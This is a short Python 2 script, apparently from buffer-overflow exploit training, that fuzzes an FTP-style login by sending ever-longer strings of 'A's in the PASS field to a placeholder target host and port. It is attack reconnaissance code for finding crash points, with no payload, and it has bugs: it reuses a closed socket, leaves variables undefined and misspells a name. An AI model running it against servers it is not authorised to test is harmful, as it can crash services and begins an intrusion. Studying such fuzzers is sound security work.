import socket
import sys

buffer = ["A"]
counter = 100
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter = counter + 200

for string in buffer:
    print "fuzzing %s bytes" % len(string)
    connenct = s.connect(("targetip",targetport))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS '+string+'\r\n')
    s.send('QUIT\r\n')
    s.close()
